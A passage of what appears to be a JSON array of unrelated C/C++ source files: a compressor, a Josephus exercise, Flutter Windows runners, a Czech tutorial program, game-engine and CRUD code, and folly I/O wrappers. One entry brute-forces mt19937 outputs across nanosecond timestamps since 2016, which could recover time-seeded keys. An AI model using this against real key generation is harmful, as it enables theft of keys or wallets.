freq(alphabet);\n    table_code.resize(alphabet);\n\n    v.push_back(sentinel); // sentinel indicator (changes V)\n\n    for(int e : v) freq[e]++;\n    for(int i=0;i<freq.size();i++) {\n        if(freq[i]==0) continue;\n        Node n(freq[i], tree.size(), i);\n        pq.push(n);\n        tree.push_back(n);\n    }\n\n    while(pq.size() > 1){\n        Node a = pq.top(); pq.pop();\n        Node b = pq.top(); pq.pop();\n        Node pai(a.freq + b.freq, tree.size());\n        pai.left = a.idx; pai.right = b.idx;\n        pq.push(pai);\n        tree.push_back(pai);\n    }\n    if(tree.size() > 1) dfs(pq.top().idx, \"\");\n    else dfs(pq.top().idx, \"0\");\n}\n\nstd::string compress(std::vector<int>& v){\n    build(v); // build huffman tree\n    std::string ans = tree_comp_form; // huffman tree as header\n    for(int el : v){\n        ans += table_code[el];\n    }\n    return ans;\n}\n\n};\n\nvoid write_file(std::string& s, std::string fileName){\n    std::ofstream fout(fileName, std::ios::binary);\n    while(s.size() % 8) s+=\"0\";\n    for(int i=0; i<s.size(); i+=8){\n        char byte = 0;\n        for(int j=i;j<i+8;j++) byte = (byte<<1) | (s[j]=='0'?0:1); \n        fout.write(&byte,1);\n    }\n    //size_t size=s.size();\n    //fout.write(&s[0],size);\n\n    fout.close();\n}\n\nint main(int argc, char* argv[]){\n    using std::chrono::high_resolution_clock;\n    using std::chrono::duration;\n    using std::chrono::milliseconds;\n    if(argc < 2){\n        std::cout << \"Please provide an input file.\\n\";\n        return 0;\n    }\n    std::cout << \"Zipzoping file...\\n\"; \n    Skew sa;\n    sa.string_from_file(argv[1]);\n\n    duration<double, std::milli> total;\n    auto t1 = high_resolution_clock::now();\n    sa.build();\n    auto out_bwt = BWT(*sa.string, *sa.suffixArray);\n    auto t2 = high_resolution_clock::now();\n    duration<double, std::milli> ms_double = t2 - t1;\n    total += ms_double;\n    // std::cout << \"SA build + BWT: \" << ms_double.count() << \"ms\\n\";\n\n    t1 = high_resolution_clock::now();\n    auto out_mtf = MTF(out_bwt);\n    t2 = high_resolution_clock::now();\n    ms_double = t2 - t1;\n    total += ms_double;\n    // std::cout << \"MTF: \" << ms_double.count() << \"ms\\n\";\n\n    t1 = high_resolution_clock::now();\n    Huffman hf;\n    auto out_hf = hf.compress(out_mtf);\n    t2 = high_resolution_clock::now();\n    ms_double = t2 - t1;\n    total += ms_double;\n    // std::cout << \"Huffman: \" << ms_double.count() << \"ms\\n\";\n\n    write_file(out_hf, \"out.compressed\");\n    std::cout << \"Success in \" << total.count() << \"ms : created out.compressed file\\n\";\n    return 0;\n}",
    "#include<iostream>\n#include<cstdlib>\nusing namespace std;\n\ntypedef struct Node{\n\tint code;\n\tint key;\n\tstruct Node* next;\n}LNode,*LinkList;\n\nvoid InitList(LinkList &L)\n{\n\tL = (LinkList)malloc(sizeof(LNode));\n\tL->next = NULL;\n}\n\nvoid ListInsert(LinkList &L,int n)\n{\n\tLinkList r = L,p;\n\tfor(int i = 1;i <= n;i++)\n\t{\n\t\tint m;\n\t\tcin >> m;\n\t\tp = (LinkList)malloc(sizeof(LNode));\n\t\tp->key = m;\n\t\tp->code = i;\n\t\tp->next = NULL;\n\t\tr->next\t= p;\n\t\tr = p;\n\t}\n}\n\nint pop(LinkList &L)\n{\n\tif(L->next == NULL) exit(0);\n\tLinkList r = L->next;\n\tL->next = L->next->next;\n\treturn r->code;\n}\n\nvoid push(LinkList &L)\n{\n\tif(L->next == NULL) return;\n\tLinkList r = L->next,p = L;\n\tif(L->next != NULL) L->next = L->next->next;\n\twhile(p->next != NULL)\n\t{\n\t\tp = p->next;\n\t}\n\tp->next = r;\n\tr->next = NULL;\n}\n\nvoid PrintList(LinkList &L)\n{\n\tLinkList r = L->next;\n\t\n\twhile(r != NULL)\n\t{\n\t\tcout << r->key << \" \";\n\t\tr = r->next;\n\t}\n\tcout << endl;\n}\n\nvoid Joseph(LinkList &L,int m)\n{\n\twhile(L->next != NULL)\n\t{\n\t\tfor(int i = 0;i < m - 1;i++)\n\t\t{\n\t\t\tpush(L);\n\t\t}\n\t\tm = L->next->key;\n\t\tcout<< pop(L) << \" \";\t\n\t}\n}\n\n\nint main()\n{   \n\tint m,n;\n\tcin >> m >> n;\n\t\n\tLinkList L;\n\tInitList(L);\n\tListInsert(L,n);\n\tJoseph(L,m);\n\tPrintList(L);\n\t\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hyrule\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <random>\n#include <chrono>\n\nint main() {\n    using namespace std::chrono;\n\n    std::cout << \"MT19937 sucks! \\n\";\n\n    auto start_date = 1477008000000000000; // 2016 - 10 - 21\n    auto now = high_resolution_clock::now().time_since_epoch().count();\n\n    for (auto entropy = start_date; entropy < now; entropy++) {\n        auto entropy2 = high_resolution_clock::duration(entropy);\n\n        std::cout << entropy2.count() << std::endl;\n        std::cout << static_cast<uint32_t>(entropy2.count()) << std::endl;\n\n        std::mt19937 rg = std::mt19937(static_cast<uint32_t>(entropy2.count()));\n\n        std::cout << \"[\"; \n\n        for (int i = 0; i < 32; ++i) {\n            std::uniform_int_distribution<uint16_t> distribution(std::numeric_limits<uint8_t>::min(), std::numeric_limits<uint8_t>::max());\n            const auto seed = static_cast<uint8_t>(distribution(rg));\n\n            std::cout << int(seed) << \",\";\n        };\n\n        std::cout << \"]\" << std::endl;\n\n    }\n\n    return 0;\n}\n",
    "\ufeff#include <iostream>\n#include <string>\nusing namespace std;\n\nvoid vypisPole(int pole[], int velikost); // Tato funkce vyp\u00ed\u0161e prvky zadan\u00e9ho pole\ndouble prumerPole(int pole[], int delka); // Tato funkce vr\u00e1t\u00ed pr\u016fm\u011br prvk\u016f zadan\u00e9ho pole\nint soucetPole(int pole[], int delka); // Tato funkce vr\u00e1t\u00ed sou\u010det prvk\u016f zadan\u00e9ho pole\nint secti(int a, int b); // Tato funkce vr\u00e1t\u00ed sou\u010det dvou \u010d\u00edsel\n\nint main() {\n    cout << \"Vitejte v ucebnici o programovani! Pro zvoleni moznosti vyuzijte POUZE cislo pred moznosti\" << endl;\n    cout << \" \" << endl;\n    cout << \"1. Funkce\" << endl;\n    cout << \"2. For cyklus\" << endl;\n    cout << \"3. While cyklus\" << endl;\n    cout << \"4. If podminka\" << endl;\n    cout << \"5. Switch podminka\" << endl;\n    cout << \"6. Datova pole\" << endl;\n    cout << \"7. Promenna string\" << endl;\n    cout << \"8. Komentare\" << endl;\n    cout << \"9. Obecne informace o programovani\" << endl;\n    cout << \"10. Informace o autorech\" << endl;\n    cout << \"----------------------------------------------------\" << ends;\n    cout << \" \" << endl;\n    cout << \"Vyberte si moznost: \" << ends;\n    int moznost;\n    cin >> moznost;\n    cout << \"----------------------------------------------------\" << endl;\n    int cisla[5] = { 1, 2, 3, 4, 5 };\n    string jmeno = \"John\";\n    string prijmeni = \"Doe\";\n    switch (moznost) {\n    case 1:\n        cout << \"Funkce je blok kodu, ktery je navrzen k provedeni urcite ulohy.\" << endl;\n        cout << \" \" << endl;\n        cout << \"Jak funguje funkce:\" << endl;\n        cout << \"1. Deklarace funkce - definuje typ navratove hodnoty, nazev funkce a parametry.\" << endl;\n        cout << \"2. Definice funkce - obsahuje telo funkce, ktere obsahuje kod, ktery se ma provest.\" << endl;\n        cout << \"3. Pouziti funkce - volani funkce v kodu.\" << endl;\n        cout << \" \" << endl;\n        cout << \"Funkce se nejcasteji pise pod main() a deklarace nad main(), ale neni pravidlem, ze se to tak musi delat, jen to musi byt mimo main(). Dela se to pro lepsi prehlednost.\" << endl;\n        cout << \" \" << endl;\n        cout << \"Syntaxe funkce: typ nazev_funkce(parametry) { Telo funkce }\" << endl;\n        cout << \" \" << endl;\n        cout << \"Priklad funkce, ktera secte dve cisla:\" << endl;\n        cout << \"int secti(int a, int b) { return a + b; }\" << endl;\n        cout << \" \" << endl;\n        cout << \"Vysledek cisel 5 a 3: \" << secti(5, 3) << endl;\n        cout << \"----------------------------------------------------\" << ends;\n        break;\n    case 2:\n        cout << \"For cyklus opakuje kod, ktery se nachazi v jeho tele, dokud plati podminka. Inicializace se provede pouze jednou na zacatku, pote se vyhodnocuje podminka a po kazde iteraci se provede inkrementace.\" << endl;\n        cout << \" \" << endl;\n        cout << \"Cely cyklus funguje tak, ze:\" << endl;\n        cout << \"1. Inicializace - provede se pouze jednou na zacatku\" << endl;\n        cout << \"2. Podminka - vyhodnocuje se na zacatku kazde iterace\" << endl;\n        cout << \"3. Inkrementace - provede se na konci kazde iterace\" << endl;\n        cout << \"4. Opakuje kroky 2 a 3, dokud neni podminka nepravdiva.\" << endl;\n        cout << \"Syntaxe for cyklu: for (inicializace; podminka; aktualizace) { Telo cyklu }\" << endl;\n        cout << \" \" << endl;\n        cout << \"Znazorneni priklad vypise sude cisla od 1-10:\" << endl;\n        cout << \"for (int i = 0; i <= 10; i += 2) {cout << i << \" \"} \" << endl;\n        cout << \" \" << endl;\n        cout << \"Vysledek for cyklu: \" << ends;\n        for (int i = 0; i <= 10; i += 2) {\n            cout << i << \", \";\n        }\n        cout << \" \" << endl;\n        cout << \"----------------------------------------------------\" << ends;\n        break;\n    case 3:\n        cout << \"While cyklus\" << endl;\n        break;\n    case 4:\n        cout << \"If podm\u00ednka\" << endl;\n        break;\n    case 5:\n        cout << \"Switch podminka umoznuje provadet ruzne casti kodu na zaklade hodnoty vyrazu.\" << endl;\n        cout << \" \" << endl;\n        cout << \"Jak funguje switch:\" << endl;\n        cout << \"1. Vyhodnoti se vyraz za 'switch'.\" << endl;\n        cout << \"2. Porovna se hodnota vyrazu s hodnotami 'case'.\" << endl;\n        cout << \"3. Pokud se najde shoda, provede se kod za odpovidajicim 'case'.\" << endl;\n        cout << \"4. Pokud zadna shoda neni, provede se kod za 'default' (pokud je pritomen).\" << endl;\n        cout << \"5. Po provedeni kodu se vykona 'break', pokud je pritomen, a tim se ukonci switch.\" << endl;\n        cout << \"Syntaxe switch podminky: switch (vyraz) { case hodnota1: // kod break; case hodnota2: // kod break; default: // kod }\" << endl;\n        cout << \" \" << endl;\n        cout << \"Priklad: Rozpoznani dne v tydnu na zaklade cisla:\" << endl;\n        cout << \"int den = 3;\" << endl;\n        cout << \"switch (den) {\" << endl;\n        cout << \"    case 1:\" << endl;\n        cout << \"        cout << 'Pondeli';\" << endl;\n        cout << \"        break;\" << endl;\n        cout << \"    case 2:\" << endl;\n        cout << \"       ",
    "#define NOMINMAX\n// API Abstraction\n#include \"PrimeEngine/APIAbstraction/APIAbstractionDefines.h\"\n\n#include \"NetworkManager.h\"\n\n// Outer-Engine includes\n\n\n// Inter-Engine includes\n#include \"../Lua/LuaEnvironment.h\"\n\n// Sibling/Children includes\n#include \"ConnectionManager.h\"\n\n// additional lua includes needed\nextern \"C\"\n{\n#include \"../../luasocket_dist/src/socket.h\"\n#include \"../../luasocket_dist/src/inet.h\"\n};\n\n#include \"../../../GlobalConfig/GlobalConfig.h\"\n#include \"PrimeEngine/Events/StandardEvents.h\"\n\nusing namespace PE::Events;\n\nnamespace PE {\nnamespace Components {\n\nPE_IMPLEMENT_CLASS1(NetworkManager, Component);\n\nNetworkManager::NetworkManager(PE::GameContext &context, PE::MemoryArena arena, Handle hMyself)\n: Component(context, arena, hMyself)\n, Networkable(context, this) // don't register networkable trhough contructor since NetworkManager is nto constructed yet\n{\n\n\t// can register networkable now here:\n\tm_networkId = s_NetworkId_NetworkManager;\n\tregisterNetworkableObject(this);\n}\n\nNetworkManager::~NetworkManager()\n{\n\n}\n\nvoid NetworkManager::addDefaultComponents()\n{\n\tComponent::addDefaultComponents();\n\n\tPE_REGISTER_EVENT_HANDLER(Events::Event_UPDATE, NetworkManager::do_UPDATE);\n}\n\nvoid NetworkManager::initNetwork()\n{\n\tluasocket_localaddr(); // get ip(s) of local machine\n\n\n}\n\nvoid NetworkManager::registerNetworkableObject(Networkable *pNetworkable)\n{\n\tassert(pNetworkable->m_networkId);\n\n\tNetworkableMap::iterator i = m_networkables.find(pNetworkable->m_networkId);\n\tassert(i == m_networkables.end());\n\n\tm_networkables[pNetworkable->m_networkId] = pNetworkable;\n\n}\n\nNetworkable *NetworkManager::getNetworkableObject(Networkable::NetworkId networkId)\n{\n\tassert(networkId);\n\n\tNetworkableMap::iterator i = m_networkables.find(networkId);\n\tassert(i != m_networkables.end());\n\tif (i != m_networkables.end())\n\t\treturn i->second;\n\n\treturn NULL;\n}\n\nvoid NetworkManager::createNetworkConnectionContext(t_socket sock, PE::NetworkContext *pNetContext)\n{\n}\n\n\nvoid NetworkManager::do_UPDATE(Events::Event *pEvt)\n{\n\t\n}\n//////////////////////////////////////////////////////////////////////////\n// NetworkManager Lua Interface\n//////////////////////////////////////////////////////////////////////////\n//\nvoid NetworkManager::SetLuaFunctions(PE::Components::LuaEnvironment *pLuaEnv, lua_State *luaVM)\n{\n/*\n\tstatic const struct luaL_Reg l_Skin[] = {\n\t\t{\"l_GetSkin\", l_GetSkin},\n\t\t{NULL, NULL} // sentinel\n\t};\n\n\tluaL_register(luaVM, 0, l_Skin);\n\n\t// run a script to add additional functionality to Lua side of Skin\n\t// that is accessible from Lua\n#if APIABSTRACTION_IOS\n\tLuaEnvironment::Instance()->runScriptWorkspacePath(\"Code/PrimeEngine/Scene/Skin.lua\");\n#else\n\tLuaEnvironment::Instance()->runScriptWorkspacePath(\"Code\\\\PrimeEngine\\\\Scene\\\\Skin.lua\");\n#endif\n*/\n}\n//\n// retrieves debug information of the skin\n/*\nint NetworkManager::l_GetSkin(lua_State *luaVM)\n{\n\tHandle h;\n\tLuaGlue::popHandleFromTableOnStackAndPopTable(luaVM, h);\n\tSkin *pSkin = h.getObject<Skin>();\n\n\t// table that will be returned\n\tlua_newtable(luaVM);\n\n\tlua_pushstring(luaVM, \"animNames\"); // \n\tlua_newtable(luaVM); // list of names\n\t{\n\t\tAnimNameSet *pNameSet = pSkin->m_hNameSet.getObject<AnimNameSet>();\n\t\tfor (int i = 0; i < (int)(pNameSet->m_size); i++)\n\t\t{\n\t\t\tlua_pushnumber(luaVM, i+1); // push index of the name\n\t\t\tlua_pushstring(luaVM, pNameSet->m_strings[i].getCStrPtr());\n\t\t\tlua_rawset(luaVM, -3); // set result[\"animNames\"][i+1]\n\t\t}\n\t}\n\tlua_rawset(luaVM, -3); // set list of names\n\n\treturn 1; // the result is the table on the stack\n}\n*/\n//////////////////////////////////////////////////////////////////////////\n\n\t\n}; // namespace Components\n}; // namespace PE\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tugas_besar_mobile\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"o_xgame\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"fichier.h\"\r\n#include \"mainwindow.h\"\r\n\r\n\r\n/*--------------------LES--FONCTIONS--DANS--LE--FICHIER--SERVICE--------------------*/\r\n\r\n Service* listeService(int * nb){\r\n    FILE *fd = fopen(\"service.txt\", \"a+\");\r\n    int i = 0;\r\n    service * ser = (service *)malloc(sizeof(service));\r\n\r\n    while(!feof(fd)){\r\n        fscanf(fd, \"%s\\t %s\\n\", ser[i].numero_service, ser[i].raison /* &ser[i].taux*/);\r\n        i++;\r\n        ser = (Service *)realloc(ser, (i+1)*sizeof(Service));\r\n    }\r\n\r\n    fclose(fd);\r\n    *nb = i;\r\n    return ser;\r\n}\r\n\r\nvoid ajoutService(service ser){\r\n     FILE *fd = fopen(\"service.txt\", \"a\");\r\n     fprintf(fd, \"%s\\t %s\\n\", ser.numero_service, ser.raison /*, ser.taux*/ );\r\n     fclose(fd);\r\n}\r\nvoid supprimerService(service sup){\r\n     FILE *fd = fopen(\"service.txt\", \"r\");\r\n     FILE *tmp = fopen(\"temp.txt\", \"w\");\r\n\r\n     service ser;\r\n     while(!feof(fd)){\r\n         fscanf(fd, \"%s\\t %s\\n\", ser.numero_service, ser.raison /*, &ser.taux*/);\r\n         if(strcasecmp(sup.numero_service, ser.numero_service) != 0){\r\n             fprintf(tmp, \"%s\\t %s\\n\", ser.numero_service, ser.raison /*, ser.taux*/);\r\n         }\r\n     }\r\n     fclose(fd); fclose(tmp);\r\n     remove(\"service.txt\");\r\n     rename(\"temp.txt\", \"service.txt\");\r\n}\r\nvoid modifierService(service * a_modifier, service * pro){\r\n    FILE *fd = fopen(\"service.txt\", \"r\");\r\n    FILE *tmp = fopen(\"temp.txt\", \"w\");\r\n\r\n    service ser;\r\n    while(!feof(fd)){\r\n        fscanf(fd, \"%s\\t %s\\n\", ser.numero_service, ser.raison/*, &ser.taux*/);\r\n        if(strcasecmp(a_modifier->numero_service, ser.numero_service) == 0){\r\n            fprintf(tmp, \"%s\\t %s\\n\", pro->numero_service, pro->raison/*, pro->taux*/);\r\n        } else {\r\n            fprintf(tmp, \"%s\\t %s\\n\", ser.numero_service, ser.raison/*, ser.taux*/);\r\n        }\r\n    }\r\n    fclose(fd); fclose(tmp);\r\n    remove(\"service.txt\");\r\n    rename(\"temp.txt\", \"service.txt\");\r\n}\r\n\r\n/*--------------------LES--FONCTIONS--DANS--LE--FICHIER--EMPLOYE--------------------*/\r\n\r\n employe* listeEmploye(int * nb1){\r\n    FILE *fd1 = fopen(\"employe.txt\", \"a+\");\r\n    int i1 = 0;\r\n    employe * emp = (employe *)malloc(sizeof(employe));\r\n    while(!feof(fd1)){\r\n        fscanf(fd1, \"%s\\t %s\\t %s\\t %s\\n\", emp[i1].numero_employe, emp[i1].nom, emp[i1].prenom, emp[i1].adresse);\r\n        i1++;\r\n        emp = (employe *)realloc(emp, (i1+1)*sizeof(employe));\r\n    }\r\n    fclose(fd1);\r\n    *nb1 = i1;\r\n    return emp;\r\n}\r\n\r\nvoid ajoutEmploye(employe emp){\r\n     FILE *fd1 = fopen(\"employe.txt\", \"a\");\r\n     fprintf(fd1, \"%s\\t %s\\t %s\\t %s\\n\", emp.numero_employe, emp.nom, emp.prenom, emp.adresse);\r\n     fclose(fd1);\r\n}\r\nvoid supprimerEmploye(employe sup1){\r\n\r\n     FILE *fd1 = fopen(\"employe.txt\", \"r\");\r\n     FILE *tmp1 = fopen(\"temp1.txt\", \"w\");\r\n\r\n     employe pat;\r\n     while(!feof(fd1)){\r\n         fscanf(fd1, \"%s\\t %s\\t %s\\t %s\\n\", pat.numero_employe, pat.nom, pat.prenom, pat.adresse);\r\n         if(strcasecmp(sup1.numero_employe, pat.numero_employe) != 0){\r\n             fprintf(tmp1, \"%s\\t %s\\t %s\\t %s\\n\", pat.numero_employe, pat.nom, pat.prenom, pat.adresse);\r\n         }\r\n     }\r\n     fclose(fd1); fclose(tmp1);\r\n     remove(\"employe.txt\");\r\n     rename(\"temp1.txt\", \"employe.txt\");\r\n}\r\nvoid modifierEmploye(employe * a_modifier1, employe * empl){\r\n    FILE *fd1 = fopen(\"employe.txt\", \"r\");\r\n    FILE *tmp1 = fopen(\"temp1.txt\", \"w\");\r\n\r\n    employe emp;\r\n    while(!feof(fd1)){\r\n        fscanf(fd1, \"%s\\t %s\\t %s\\t %s\\n\", emp.numero_employe, emp.nom, emp.prenom, emp.adresse);\r\n        if(strcasecmp(a_modifier1->numero_employe, emp.numero_employe) == 0){\r\n            fprintf(tmp1, \"%s\\t %s\\t %s\\t %s\\n\", empl->numero_employe, empl->nom, empl->prenom, empl->adresse);\r\n        } else {\r\n            fprintf(tmp1, \"%s\\t %s\\t %s\\t %s\\n\", emp.numero_employe, emp.nom, emp.prenom, emp.adresse);\r\n        }\r\n    }\r\n    fclose(fd1); fclose(tmp1);\r\n    remove(\"employe.txt\");\r\n    rename(\"temp1.txt\", \"employe.txt\");\r\n}\r\n\r\n\r\n/*--------------------LES--FONCTIONS--DANS--LE--FICHIER--TRAVAIL--------------------*/\r\n\r\n prestation* listePrestation(int * nb2){\r\n    FILE *fd2 = fopen(\"prestation.txt\", \"a+\");\r\n    int i2 = 0;\r\n    prestation * trav = (prestation *)malloc(sizeof(prestation));\r\n    while(!feof(fd2)){\r\n        fscanf(fd2, \"%s\\t %s\\t %s\\t %d\\t %d\\t %[^\\n]\\n\", trav[i2].numero_prestation, trav[i2].numero_service1,trav[i2].numero_employe1 ,&trav[i2].taux,&trav[i2].nbheure,trav[i2].date2);\r\n\r\n        i2++;\r\n        trav = (prestation *)realloc(trav, (i2+1)*sizeof(prestation));\r\n    }\r\n    fclose(fd2);\r\n    *nb2 = i2;\r\n    return trav;\r\n}\r\n\r\nvoid ajoutPrestation(prestation trav){\r\n      FILE *fd2 = fopen(\"prestation.txt\", \"a\");\r\n      fprintf(fd2, \"%s\\t %s\\t %s\\t %d\\t %d\\t %s\\n\", trav.numero_prestation, trav.numero_service1,trav.numero_employe1,trav.taux,trav.nbheure,trav.date2);\r\n      fclose(fd2);\r\n }\r\nvoid supprimerPrestation(prestation sup2){\r\n\r\n      FILE *fd2 = fopen(\"prestation.txt\", \"r\");\r\n      FILE *tmp2 = fopen(\"temp2.txt\", \"w\");\r\n\r\n      p",
    "/*\n * Copyright (c) Meta Platforms, Inc. and affiliates.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <folly/portability/SysUio.h>\n\n#include <cerrno>\n#include <cstdio>\n\n#include <folly/ScopeGuard.h>\n#include <folly/portability/Sockets.h>\n#include <folly/portability/SysFile.h>\n#include <folly/portability/Unistd.h>\n\ntemplate <class F, class... Args>\nstatic int wrapPositional(F f, int fd, off_t offset, Args... args) {\n  off_t origLoc = lseek(fd, 0, SEEK_CUR);\n  if (origLoc == off_t(-1)) {\n    return -1;\n  }\n  if (lseek(fd, offset, SEEK_SET) == off_t(-1)) {\n    return -1;\n  }\n\n  int res = (int)f(fd, args...);\n\n  int curErrNo = errno;\n  if (lseek(fd, origLoc, SEEK_SET) == off_t(-1)) {\n    if (res == -1) {\n      errno = curErrNo;\n    }\n    return -1;\n  }\n  errno = curErrNo;\n\n  return res;\n}\n\nnamespace {\n#if !FOLLY_HAVE_PREADV\nssize_t preadv_fallback(int fd, const iovec* iov, int count, off_t offset) {\n  return static_cast<ssize_t>(wrapPositional(readv, fd, offset, iov, count));\n}\n#endif\n\n#if !FOLLY_HAVE_PWRITEV\nssize_t pwritev_fallback(int fd, const iovec* iov, int count, off_t offset) {\n  return static_cast<ssize_t>(wrapPositional(writev, fd, offset, iov, count));\n}\n#endif\n} // namespace\n\nnamespace folly {\n#if !FOLLY_HAVE_PREADV\nssize_t preadv(int fd, const iovec* iov, int count, off_t offset) {\n  using sig = ssize_t(int, const iovec*, int, off_t);\n  static auto the_preadv = []() -> sig* {\n#if defined(__APPLE__) && FOLLY_HAS_BUILTIN(__builtin_available) && \\\n    !TARGET_OS_SIMULATOR &&                                         \\\n    (__MAC_OS_X_VERSION_MAX_ALLOWED >= 101600 ||                    \\\n     __IPHONE_OS_VERSION_MAX_ALLOWED >= 140000)\n    if (__builtin_available(iOS 14.0, macOS 11.0, watchOS 7.0, tvOS 14.0, *)) {\n      return &::preadv;\n    }\n#endif\n    return &preadv_fallback;\n  }();\n\n  return the_preadv(fd, iov, count, offset);\n}\n#endif\n\n#if !FOLLY_HAVE_PWRITEV\nssize_t pwritev(int fd, const iovec* iov, int count, off_t offset) {\n  using sig = ssize_t(int, const iovec*, int, off_t);\n  static auto the_pwritev = []() -> sig* {\n#if defined(__APPLE__) && FOLLY_HAS_BUILTIN(__builtin_available) && \\\n    !TARGET_OS_SIMULATOR &&                                         \\\n    (__MAC_OS_X_VERSION_MAX_ALLOWED >= 101600 ||                    \\\n     __IPHONE_OS_VERSION_MAX_ALLOWED >= 140000)\n    if (__builtin_available(iOS 14.0, macOS 11.0, watchOS 7.0, tvOS 14.0, *)) {\n      return &::pwritev;\n    }\n#endif\n    return &pwritev_fallback;\n  }();\n\n  return the_pwritev(fd, iov, count, offset);\n}\n#endif\n} // namespace folly\n\n#ifdef _WIN32\ntemplate <bool isRead>\nstatic ssize_t doVecOperation(int fd, const iovec* iov, int count) {\n  if (!count) {\n    return 0;\n  }\n  if (count < 0 || count > folly::kIovMax) {\n    errno = EINVAL;\n    return -1;\n  }\n\n  // We only need to worry about locking if the file descriptor is\n  // not a socket. We have no way of locking sockets :(\n  // The correct way to do this for sockets is via sendmsg/recvmsg,\n  // but this is good enough for now.\n  bool shouldLock = !folly::portability::sockets::is_fh_socket(fd);\n  if (shouldLock && lockf(fd, F_LOCK, 0) == -1) {\n    return -1;\n  }\n  SCOPE_EXIT {\n    if (shouldLock) {\n      lockf(fd, F_ULOCK, 0);\n    }\n  };\n\n  ssize_t bytesProcessed = 0;\n  int curIov = 0;\n  void* curBase = iov[0].iov_base;\n  size_t curLen = iov[0].iov_len;\n  while (curIov < count) {\n    ssize_t res = 0;\n    if (isRead) {\n      res = read(fd, curBase, (unsigned int)curLen);\n      if (res == 0 && curLen != 0) {\n        break; // End of File\n      }\n    } else {\n      res = write(fd, curBase, (unsigned int)curLen);\n      // Write of zero bytes is fine.\n    }\n\n    if (res == -1) {\n      return -1;\n    }\n\n    if (size_t(res) == curLen) {\n      curIov++;\n      if (curIov < count) {\n        curBase = iov[curIov].iov_base;\n        curLen = iov[curIov].iov_len;\n      }\n    } else {\n      curBase = (void*)((char*)curBase + res);\n      curLen -= res;\n    }\n\n    if (bytesProcessed + res < 0) {\n      // Overflow\n      errno = EINVAL;\n      return -1;\n    }\n    bytesProcessed += res;\n  }\n\n  return bytesProcessed;\n}\n\nextern \"C\" ssize_t readv(int fd, const iovec* iov, int count) {\n  return doVecOperation<true>(fd, iov, count);\n}\n\nextern \"C\" ssize_t writev(int fd, const iovec* iov, int count) {\n  return doVecOperation<false>(fd, iov, count);\n}\n#endif\n",
